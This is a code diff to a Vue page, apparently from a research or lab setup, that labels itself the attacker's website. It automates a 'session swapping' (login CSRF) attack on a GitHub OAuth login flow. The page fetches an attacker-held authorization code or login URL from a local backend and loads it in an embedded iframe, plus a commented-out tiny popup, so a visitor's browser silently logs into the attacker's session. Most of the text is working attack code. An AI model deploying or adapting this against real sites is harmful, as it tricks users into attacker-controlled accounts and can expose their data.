@@ -1,7 +1,7 @@
 <template>
   <div class="dashboard">
     <h1>This is the Attacker's Website</h1>
-    <h2>Session Swapping for Github Server Flow Login</h2>
+    <h2>Automated Session Swapping for Github</h2>
     </div>
         <img src="@/assets/cat-cats.gif">
         <br>
@@ -14,7 +14,7 @@
         <!-- <iframe :src=evil_link2 style="width:100%;">
         </iframe> -->
 
-        <iframe :src=evil_link style="width:100%;">
+        <iframe :src=evil_link2 style="width:100%;">
         </iframe>
     <div>
   </div>
@@ -49,47 +49,47 @@
     //     var win = window.open('http://localhost:8080/twitter_login?state=state&code=YndBbFNPTXlUa1hiblprLVN0ZkFrMUVJV2pVM1d6UnFkbUVQOWt4cTc1WmExOjE2Nzg1Mzc2NDAzMTQ6MTowOmFjOjE','windowname','width=1,height=1,left=5,top=3');
     //     setTimeout(function() { win.close();}, 3000);
     //   };
-        // const evil_link2 = ref('');
-        // const getUrlCode = async () => {
-        //     // console.log("inside getUrlCode")
-        //     const resData = await axios.get('http://localhost:8081/oauthcode/get_github_url');
-        //     if (resData.status === 200) {
-        //         const url = resData.data;
-        //         console.log("url", url)
-        //         evil_link2.value = url
-        //     }
-        // };
-
-        const evil_link = ref('');
-        const getCode = async () => {
-            // console.log("inside get code")
-            try {
-                const resData = await axios.get('http://localhost:8001/oauthcode/get_code');
-                if (resData.status === 200) {
-                    // evil_link.value = 'http://localhost:8080/login?code=a89ef531c4487acde0c0&login_method=githubLoginSF'
-                    const code = resData.data;
-                    console.log("code",code)
-                    // evil_link.value = `http://localhost:8080/login?state=state&code=${code}&login_method=twitterLoginSF`
-                    // evil_link.value = 'http://localhost:8080/login?code=a89ef531c4487acde0c0&login_method=githubLoginSF'
-                    evil_link.value = `http://localhost:8080/login?code=${code}&login_method=githubLoginSF`
-                    // console.log(evil_link.value)
-                } else {
-                alert('Unknown Error Occurs');
-                }
-            } catch (error) {
-                alert('Unknown Error Occurs');
-            } finally {
-                // Empty here
+        const evil_link2 = ref('');
+        const getUrlCode = async () => {
+            // console.log("inside getUrlCode")
+            const resData = await axios.get('http://localhost:8001/cookies/get_github_url');
+            if (resData.status === 200) {
+                const url = resData.data;
+                console.log("url", url)
+                evil_link2.value = url
             }
         };
 
-        // getUrlCode();
-        getCode();
+        // const evil_link = ref('');
+        // const getCode = async () => {
+        //     // console.log("inside get code")
+        //     try {
+        //         const resData = await axios.get('http://localhost:8081/oauthcode/get_code');
+        //         if (resData.status === 200) {
+        //             // evil_link.value = 'http://localhost:8080/login?code=a89ef531c4487acde0c0&login_method=githubLoginSF'
+        //             const code = resData.data;
+        //             console.log("code",code)
+        //             // evil_link.value = `http://localhost:8080/login?state=state&code=${code}&login_method=twitterLoginSF`
+        //             // evil_link.value = 'http://localhost:8080/login?code=a89ef531c4487acde0c0&login_method=githubLoginSF'
+        //             evil_link.value = `http://localhost:8080/login?code=${code}&login_method=githubLoginSF`
+        //             // console.log(evil_link.value)
+        //         } else {
+        //         alert('Unknown Error Occurs');
+        //         }
+        //     } catch (error) {
+        //         alert('Unknown Error Occurs');
+        //     } finally {
+        //         // Empty here
+        //     }
+        // };
+
+        getUrlCode();
+        // getCode();
 
 
     return {
-        evil_link,
-        // evil_link2,
+        // evil_link,
+        evil_link2,
     //   forceLogin
     };
     },
